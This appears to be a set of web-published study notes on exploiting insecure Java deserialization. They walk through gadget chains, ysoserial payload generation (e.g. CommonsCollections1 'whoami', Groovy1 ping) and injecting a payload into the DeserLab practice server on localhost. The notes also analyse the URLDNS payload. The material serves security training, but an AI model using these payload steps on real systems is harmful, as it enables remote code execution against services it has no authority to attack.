</code></pre><p id="08aff56a-d2d7-404c-8a9f-83a243dffc55" class="">Properties and Reflection: An objects properties in their simplest form are spotted in the formar:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="292fefa0-b15f-4078-8e05-7209ce6ccbc7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Object.one.two
# two is a property of one
# one is a property of Object
</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30663fa4-bde1-40ff-a4c8-87bbd8fa9a47" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Java.lang.Runtime.getRuntime.exe(&#x27;id&#x27;)
# method exec(&#x27;id&#x27;) is a property of getRuntime
# which is a property of Java.lava.Runtime
</code></pre><ul id="7030f3e1-057d-4a3d-9140-c7a51e8e131c" class="bulleted-list"><li style="list-style-type:disc">During deserialization, the objets properties are accessed recursively, leading to code execution at the very end of this process.</li></ul><p id="ff1c033b-330f-42c3-9dac-b4445713e1a3" class="">→ Reflection: https://www.oracle.com/technical-resources/articles/java/javareflection.html</p><blockquote id="cbe2b683-8030-4944-bac4-7c5fa042a939" class="">Can be recognized by the opaque calling order in the code</blockquote><blockquote id="10ecde36-a6ff-4401-8f2e-c591edef8dd9" class="">A potentially exploitable condition in Java occurs when readObject() or sia similar function is called on user-controlled object and later, a method on that object is called.</blockquote><p id="ed081fc7-9a10-4fda-8704-6901dc166cd9" class="">An attacker is able to craft an object containing multiple, nested properties, that upon method call will do something completely different</p><p id="ed7dd07f-6d62-4331-9af7-ce15c6901ffd" class="">Implementing a Dynamic Proxy:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9c46fe31-c005-4eb7-a4ad-368e65a0b67c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://www.baeldung.com/java-dynamic-proxies
</code></pre><p id="c3b66655-c4dc-4062-9ef8-58fc6358dc72" class="">Invocation handler:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dd6196aa-914f-43bd-9b06-4c9bf377e596" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://www.concretepage.com/java/dynamic-proxy-with-proxy-and-invocationhandler-in-java
</code></pre><h3 id="57b64929-86a8-4699-a28c-d1d50ab8e93f" class=""><strong>Gadgets</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#gadgets"></a></strong></h3><p id="96ee9f68-6ea5-4447-a72f-6d2e04f78e77" class="">Every property or method that is part of a nested exploit object is called a gadget</p><ul id="53979c8a-986a-403f-b7b1-514e0caca584" class="bulleted-list"><li style="list-style-type:disc">gadgets libraries are some java libraries that were identified to contain gadgets used to build serialized exploit objects.</li></ul><p id="e526bbc7-99eb-454b-982c-0b2cea5be3d7" class="">It was first presented as:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a0a7f59-ec99-4c21-91d7-a9e004a160d8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://frohoff.github.io/appseccali-marshalling-pickles/
</code></pre><p id="ee8079fc-f85d-4bb4-a2a2-cd60159927e3" class="">Does not mean that gadgets libraries are insecure, it means that an attacker can abuse them to construct a known gadget chain that will result in seccessful exploitation.</p><p id="6f5a6efe-95c1-4a88-aada-06f7fc4df6b0" class="">There is a tool called <strong>ysoserial</strong> that can be used to perform exploitation of insecure java deserialization vulnerabilties.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f14efcb8-68e8-440e-80de-c881278891f3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://github.com/frohoff/ysoserial
</code></pre><h2 id="537a99d8-e3b7-404c-8c15-1b3cc3139e70" class=""><strong>Introduction to Ysoserial</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#introduction-to-ysoserial"></a></strong></h2><p id="8d327036-feef-49a3-9bb7-bd90f51871d2" class="">It can be downloaded along with the source code and a precompiled .jar file</p><ul id="98ab917e-d9d1-4220-ba63-8084e49b36b8" class="bulleted-list"><li style="list-style-type:disc">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</li></ul><p id="acb3f87d-9495-4a3d-a884-4266c96a5046" class="">Usage:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b2a92709-a383-4c00-82c2-d874d3ad9874" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">java -jar ysoserial.jar //displays the help message
</code></pre><p id="c88adfda-60d7-4c81-a169-8c1be0eb33d5" class="">Often we need to convert the output to Base64 in order to be able to send it to an application.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b3d418cf-e757-4d61-850d-9fdab7e47cda" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 &quot;whoami&quot;
</code></pre><blockquote id="fff54012-10be-4bac-83e8-ab59e64a7df2" class="">This command generates a serialized payload, that upon being insecurely deserialized by an application that includes CommonCollections1 in its classpath, will result in executing the command whoami</blockquote><p id="9c054da5-0791-42d0-944c-505fcec76300" class="">Additions to Ysoserial:</p><ul id="7d11ebe2-69a1-4e13-a7b4-ad7f5982a3ec" class="bulleted-list"><li style="list-style-type:disc">Several Burpsuite Pro extensions have been developed in order to make java serialization detection and exploitation easier.</li></ul><p id="b2fb4d94-3267-4426-be6f-4f4bc0748853" class="">Such as:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aeecf483-2372-4650-b256-90e2bcb428e5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Freddy, Deserialization Bug Finder:
# https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3

Java Deserialization Scanner:
# https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae
</code></pre><h3 id="331bf2b7-cfc8-4aae-89c0-10a8af30a468" class=""><strong>brute-Force Attack with Ysoserial</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#brute-force-attack-with-ysoserial"></a></strong></h3><p id="1abbe1be-d46a-48e0-949a-7716ba7bb1c5" class="">When approaching an application that utilizes serialized java data, we dont know what libraries are used by the backend.</p><ul id="8b9ac722-c913-4e8a-94e4-1ee680230cb9" class="bulleted-list"><li style="list-style-type:disc">In this case, brute-force approach might work. We can generate all possible Ysoserial payloads and the try each of them against the target software</li></ul><figure id="8fbb6d7b-8a01-4c95-8d1f-6a81f6a13119" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/21.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/21.png"/></a></figure><blockquote id="e3365da6-f1f9-4434-a3be-d455ed07cdfd" class="">The script will run and create a Base64-encoded serialized payload For each vulnerable library. The result files can be further used in Burp Intruder Attacks</blockquote><h3 id="d7e2d213-a577-459f-8405-0f5c2634b1ef" class=""><strong>Exploring Ysoserial</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#exploring-ysoserial"></a></strong></h3><p id="1dade53a-136e-49fa-a372-555c66a90a86" class="">Each of the <em>.java</em> files can be run as a separate java class, resulting in executing different code by the <em>Ysoserial</em> tool.</p><ul id="7c96eae9-7252-4745-871c-2cb0f84747f8" class="bulleted-list"><li style="list-style-type:disc">Its possible to select and invoke a single method out of a jar archive</li></ul><p id="24400331-673c-44d8-8f1c-7314bb40207c" class="">With the command line java utility:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fec32fce-e9e1-400b-9f38-5009ba23c1dd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">-cp (classpath) argument
</code></pre><ul id="cd19aef1-9d84-4885-8b14-1dfe210e9993" class="bulleted-list"><li style="list-style-type:disc">The classpath contains all locations where the java virtual machine will look For methods available For the process runtime. In that case, we need to specify the Ysoserial .jar file as the classpath.</li></ul><p id="082af624-5637-49b1-94b3-3b9341b6b406" class="">Inside the the package Ysoserial there is a folder exploit that contains several classes. Each of these classes contain an exploit utility</p><p id="ddb59026-583c-402a-97c4-56e796bbe887" class="">Example ysoserial/exploit/JSF.java:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2e56e2a5-4015-440a-a15b-7bfe4a5c8a7d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">java -cp ysoserial.jar ysoserial.exploit.JSF
</code></pre><p id="3dd2f7b0-5b6e-478c-aa11-2adc0958f99b" class="">The JSF payload can be used to attack serialization in Java Faces VIEWSTATE parameter.</p><blockquote id="66eb29b0-905e-438e-8416-b04b1f7d0177" class="">Keep in mind, that we omit the .java extension, which is assumed by default by the java environment.</blockquote><h2 id="ee8fd074-4d2a-487b-a9d0-eba82082f118" class=""><strong>Exploiting Java Deserialization</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#exploiting-java-deserialization"></a></strong></h2><p id="50f450ff-0114-43ae-91cb-4688d0ce2d99" class="">→ https://github.com/NickstaDB/DeserLab</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="06a348b6-7675-4d0c-a8bc-bf47ea507709" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># run the server and client
# open wireshark to sniff the network

# server:
Java -jar DeserLab.jar -server 127.0.0.1 6666

# try to connect with netcat:
nc 127.0.0.1 6666
</code></pre><ul id="425c6b10-3333-4bef-9f11-8f2029d40044" class="bulleted-list"><li style="list-style-type:disc">We can see that the server received our connection</li></ul><p id="9fa1e992-45ec-4b8c-b06c-f661789b5a88" class="">Lets try to connect with the DeserLabs client:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="468288a6-e2b0-4c95-bdd9-644c1f4681c1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">java -jar DeserLab.jar -client 127.0.0.1 6666
</code></pre><ul id="b9d6e29f-5aa9-4b13-89a5-c7f167c64b48" class="bulleted-list"><li style="list-style-type:disc">In wireshark we can see Java serialized data in the communication</li></ul><ul id="ef7ac91e-2974-4aa9-81b9-5281df3dde7a" class="bulleted-list"><li style="list-style-type:disc">Save the wireshark dump as deserialization.pcap</li></ul><h3 id="2e3be7a2-fb38-4841-89ab-2758922bd38b" class=""><strong>Deciphering Serialized Data</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#deciphering-serialized-data"></a></strong></h3><p id="6da62ceb-ef4b-4054-8e53-30e798b0595b" class="">In order to automate revision of all packages sent:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="35f162d9-be54-4bba-b58f-ebac9dcb8dce" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">tshark tool
# it can extracted the serialization stream

# syntax:
tshark -r deserialization.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep -v &#x27;,,&#x27; | grep &#x27;^6666,&#x27; | cut -d&#x27;,&#x27; -f2 | -tr &#x27;\n&#x27; &#x27;:&#x27; | sed s/://g
</code></pre><p id="d013ba79-f06e-4cb9-909f-7cf1c2915f21" class="">For every object/value transported in Java serialized data, there is a predecing byte of certain value that identifies its type</p><figure id="74614c22-064e-4cbb-9a5c-6e9731eb3520" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/22.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/22.png"/></a></figure><p id="c8227f01-b872-428e-9541-c165dbeed691" class="">We can inspect any Java Serialized stream to identify the object it contains using the Java Serialization Dumper tool</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="de66373f-6a86-45da-a74d-3ab814e042a1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://github.com/NickstaDB/SerializationDumper
</code></pre><ul id="e8933690-12d0-4c0b-8f98-893ed3efba84" class="bulleted-list"><li style="list-style-type:disc">The tool takes a hex representation of serialized bytes and dumps the objects the byte stream consists of.</li></ul><figure id="58220dfb-bee4-456f-8a3c-e283d9941950" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/23.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/23.png"/></a></figure><blockquote id="841afd1f-0c46-4137-90e8-5ae2bcca7d8d" class="">The tool dumps every object that is contained with the serialized stream</blockquote><h3 id="cbba069b-99a3-447f-a1d6-ed9a451962ac" class=""><strong>Injecting Serialized Payload</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#injecting-serialized-payload"></a></strong></h3><p id="be5e43bb-6523-4238-8c62-c7923dc0015e" class="">We will build a python script that mimic the initial serizalized handshake (0xaced0005) and then replace the serialized data (in this case the string hash with the Ysoserial payload and hope For code execution)</p><ul id="85634682-5987-40ac-a17d-ba178fe129d5" class="bulleted-list"><li style="list-style-type:disc">Based on the output of Serialization Dumper, part of the communication must be mimicked using python; this includes the handshake, two TC_BLOCKDATA structures and the username</li></ul><ul id="2bf758a6-025e-4c55-bef9-cd8d22d589a2" class="bulleted-list"><li style="list-style-type:disc">Further down our exploit the hashed string will be replaced with serialized data originating from the Ysoserial tool</li></ul><p id="bfd3333e-3b6f-4864-8d2a-022aaabd71f3" class="">In this case the Groovy library is chosen since its utilized by DeserLab.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c65561c0-2305-4180-b5fe-58e71c905dc7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">java -jar ysoserial-master-SNAPSHOT.jar Groovy1 &quot;ping 127.0.0.1&quot; &gt; p.bin
</code></pre><p id="9a16756f-a8ce-4f04-83be-2507e9391068" class="">The payload contains the java serialization signature in the beginning. Since the serialized conversation is already started, we should remove it from the payload.</p><figure id="73d42c5e-b084-4c03-808f-43f9c5f46e4a" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/24.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/24.png"/></a></figure><p id="57b08440-5120-458b-ac75-3dc47be685e5" class="">As previously mentioned, it contains all structures dumped by the SerializationDumper tool until the hashed string, which is replaced by the Ysoserial payload without its first 4 bytes (aced0005)</p><p id="5405032e-83a5-419c-ab49-4db4b15baac8" class="">Lets now listen to any ICMP packets on the loopback (127.0.0.1) interface while attacking the DeserLab server using our freshly prepared exploit.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="00f31443-e0f2-44f2-aac8-c3d53f796119" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">tcpdump -i lo icmp
python serialization.py
</code></pre><blockquote id="348a1c3a-d057-49ef-860e-d36af19890d5" class="">The server received the connection and ping was executed</blockquote><h3 id="b5270d52-300a-450a-bb5c-cc33a1ee3a83" class=""><strong>Analysis of URLDNS Payload</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#analysis-of-urldns-payload"></a></strong></h3><p id="612eccbe-3634-49c9-81f9-45d6d804ee64" class=""><em>URLDNS</em> is a payload from Ysoserial. It does not result in code execution</p><ul id="c6a47ad4-3405-40bd-9023-3d003b8604ff" class="bulleted-list"><li style="list-style-type:disc">Instead, it makes the deserializing endpoint resolve an arbritary DNS name.</li></ul><ul id="901d60fb-31eb-4caf-ba1c-a95920d2b004" class="bulleted-list"><li style="list-style-type:disc">It has low impact, but on the other hand it uses Java built-in features, so its likely to work almost in every case.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6f07c8d9-58a9-41f1-94bb-0eba8bdd2cfb" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java
</code></pre><p id="a0d4409e-98f7-4611-b4d2-767abf2f8f84" class="">We can observe a gadget chain of 4 objects</p><p id="ab1a3cb8-4c21-4632-b4cf-ca6201f5ae73" class="">Gadget Chain:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b31867bd-e8c1-4c69-9491-57c364deee66" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">HashMap.readObject()
  HashMap.putVal()
    HashMap.hash()
      URL.hashCode()
</code></pre><ul id="03abae92-6d84-4953-a168-94ffe2c93b61" class="bulleted-list"><li style="list-style-type:disc">HashMap.readObject()** causes Java to instantiate the deserialized object upon successfull deserialization. The hashmap contains a hashed URL object, which due to java built-in mechanisms, will be arbritraty resolved.</li></ul><ul id="0c992051-9dca-42d5-9193-d075e6545e1e" class="bulleted-list"><li style="list-style-type:disc">Its crafted in the public method getObject</li></ul><ul id="1cbc68cb-ac8e-4bf3-a249-6abd6426500c" class="bulleted-list"><li style="list-style-type:disc">HashMap is a Java data type that stored data in key-value pairs, its often used in deserialization exploits</li></ul><p id="7cf81aa9-2616-4287-84f0-5855249ee125" class="">First, <strong>SilentURLStreamHandler</strong> is used in order not to resolve the URL upon creation of the serialized object. The <strong>url</strong> variable is the user-supplied url to be resolved.</p><ul id="ac391484-abeb-4cdc-9120-7f7a55ebd864" class="bulleted-list"><li style="list-style-type:disc">line 55, a new HashMap is defined</li></ul><ul id="2450fee3-186f-455a-a5cf-95cd97113c69" class="bulleted-list"><li style="list-style-type:disc">then, a data type java.net.URL is assigned to the Hashmap, to key <strong>u</strong></li></ul><ul id="a22ab95c-589d-4bdd-9006-9efcb5bf3444" class="bulleted-list"><li style="list-style-type:disc">next, the hashCode of the URL is calculated. Upon, deserialization, the URL in which the hashCode was calculated will be resolved resulting in arbitrary DNS resolution.</li></ul><h3 id="651e32cd-282e-498e-96d8-881da9a2ea7d" class=""><strong>Arbitrary DNS Resolution Exploit</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#arbitrary-dns-resolution-exploit"></a></strong></h3><p id="3f198738-7def-4e3b-ab51-6b755cbd0562" class="">The payload is generated to the p.bin file, which was previously used to execute ping</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" 